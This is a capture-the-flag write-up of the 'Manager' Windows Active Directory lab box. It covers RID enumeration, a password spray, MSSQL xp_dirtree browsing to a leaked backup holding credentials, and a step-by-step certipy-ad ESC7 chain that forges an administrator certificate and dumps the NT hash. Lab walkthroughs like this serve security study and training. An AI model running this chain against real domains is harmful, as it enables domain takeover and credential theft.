---
title: Manager
date: 2026-09-29
description: Medium Windows AD box lowercasing RID-derived usernames for operator, walking xp_dirtree to an old website zip, and chaining ESC7 officer rights on manager-DC01-CA for the administrator hash.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Tue Sep 29 11:48:59 2026 as: /usr/lib/nmap/nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49693,49723,49790,53402 -A -oN scan_results.txt 10.129.11.75
Nmap scan report for manager.htb (10.129.11.75)
Host is up (0.63s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-29 22:57:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-29T22:59:33+00:00; +7h08m18s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Window10.129.11.75s Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-29T22:59:31+00:00; +7h08m17s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.11.75:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-29T18:40:58
|_Not valid after:  2056-09-29T18:40:58
| ms-sql-info: 
|   10.129.11.75:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-09-29T22:59:32+00:00; +7h08m17s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-29T22:59:32+00:00; +7h08m17s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-29T22:59:31+00:00; +7h08m17s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49790/tcp open  msrpc         Microsoft Windows RPC
53402/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-29T22:58:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h08m16s, deviation: 0s, median: 7h08m16s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   764.18 ms 10.10.16.1
2   142.00 ms manager.htb (10.129.11.75)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 29 11:51:25 2026 -- 1 IP address (1 host up) scanned in 145.95 seconds
```

- No LDAP unauthenticated bind
- Nothing interesting in the web application (no interesting directories or subdomains)

SMB **guest user** access worked, though the shares themselves were just the defaults. We moved on to RID brute forcing, which gave us a solid list of usernames:

```sh
sed -n 's/.*MANAGER\\\([^ ]*\) (SidTypeUser).*/\1/p' rids.txt
```

```usernames
Administrator
Guest
krbtgt
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
DC01$
```

We tried finding users with Kerberos pre-authentication disabled — no one had it, and username-as-password didn't work either. So we turned the first letter of every username to lowercase:

```sh
sed 's/^\(.\)/\L\1/' usernames.txt
```

|             |                                                                                           |
| ----------- | ----------------------------------------------------------------------------------------- |
| `sed`       | Stream editor—processes text line by line                                                 |
| `'s/...'`   | Substitute command (find and replace)                                                     |
| `^`         | Anchor—matches the start of the line                                                      |
| `\(.\)`     | Capture group—`\(` and `\)` create a group; `.` matches any single character              |
| `/`         | Delimiter separating the search pattern from the replacement                              |
| `\L\1`      | `\L` converts to lowercase; `\1` refers to the first captured group (the first character) |
| `users.txt` | The input file                                                                            |

Created a wordlist with lowercase `lusers.txt`

For forking the spray we can use `--no-brute` in nxc

> `Operator - operator`

Operator didn't look like a real person, and that's what pointed us at the **MSSQL server** listening on 1433

# User
#### MSSQL

```sh
impacket-mssqlclient manager.htb/Operator:'operator'@10.129.11.75
```

Operator isn't registered as a MSSQL user, so we need `-windows-auth`:

- **-windows-auth** -> uses your Windows domain credentials instead of a SQL Server password.

```sh
impacket-mssqlclient manager.htb/Operator:'operator'@10.129.11.75 -windows-auth
```

We have restrictions on using `xp_cmdshell`.

We first tried `xp_dirtree` to connect to our machine and captured the NTLM hash in Responder, but the host was "**DC01**", which is useless — the hash for a machine account is generated with a **random string**.

But we can use **xp_dirtree** to explore the website to find any hidden pages.

> **Note** : We use `master..` only if we are not in the master db

We tried to get the user flag but it returned blank because we didn't have enough permission:

```sql
exec xpdirtree 'C:\inetpub\', 1, 1;
```

- `wwwroot` looks interesting

```
exec xpdirtree 'C:\inetpub\wwwroot\', 1, 1;
```

- `1, 1` -> Shows folders and files ("1st for depth and 2nd for file")

> **Note**: Without defining proper depth it will display everything, which is more confusing

Guess we got the web application directory, and there are two files:

- `web.config` -> responded with 404 error when visited
- `website-backup-27-07-23-old.zip` -> when visited, it downloaded the zip file

```url
http://manager.htb/website-backup-27-07-23-old.zip
```

Extract the downloaded zip file:

```sh
unzip website-backup-27-07-23-old.zip -d ./website-backup-27-07-23-old
```

```sh
tree -a website-backup-27-07-23-old

website-backup-27-07-23-old
├── about.html
├── contact.html

...<SNIP>...

├── index.html
├── js
│   ├── bootstrap.js
│   └── jquery-3.4.1.min.js
├── .old-conf.xml
└── service.html
```

There's a **hidden** `old-conf.xml` file which revealed the password of the system user:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>

```

> `Raven - R4v3nBe5tD3veloP3r!123`

# Root

Nothing interesting came back from bloodhound.

```powershell
ps > whomai /all
```

**Raven** is a member of the local **Certificate service** group:

- `BUILTIN\Certificate Service DCOM Access`

Quick check for any vulnerable certificate:

```sh
certipy-ad find -u Raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.11.75 -vulnerable -enabled
```

```sh
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
 
...<SNIP>...

[+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

We found an **ESC7** vulnerability:

> Reference :
> - https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca
> - https://hacktricks.wiki/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#attack-2


```sh
certipy-ad ca -ca manager-DC01-CA -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -add-officer Raven -ns 10.129.11.75
```

- Adds Raven as an officer to the Certificate Authority, granting CA management privileges.

```sh
certipy-ad ca -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.11.75 -ca 'manager-DC01-CA' -enable-template 'SubCA'
```

- Enables the SubCA certificate template on the CA so it can be requested.

```sh
certipy-ad req -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.11.75 -ca 'manager-DC01-CA' -template 'SubCA' -upn administrator@manager.htb
```

- Requests a SubCA certificate on behalf of the administrator account using the enabled template.
- A **private key** is generated along with a `Request ID`

```sh
certipy-ad ca -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.11.75 -ca 'manager-DC01-CA' -issue-request 25
```

- Issues certificate request #**25**, generating a valid certificate that can be used for authentication.

- If the result is an error `[-] Access denied: Insufficient permissions to issue certificate`:

We have to start the whole chain over from the officer assignment step

> **Important** : There's a script which rewrites permissions to default, so we have to be faster.... God Speed

```sh
certipy-ad req -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.11.75 -ca 'manager-DC01-CA' -retrieve 25
```

- Retrieves and downloads the issued certificate from request #25 on the Certificate Authority, saving it locally for authentication.

```sh
faketime 'now +7 hours +08 minutes +16 seconds' certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.11.75
```

- Authenticates to the domain using the administrator certificate (from the .pfx file), requesting a **Kerberos TGT** to gain domain access as the administrator account.
- It dumps the **NT hash** of the admin using the **admin ccache** file gained from the **pfx file**.

Gained `root`
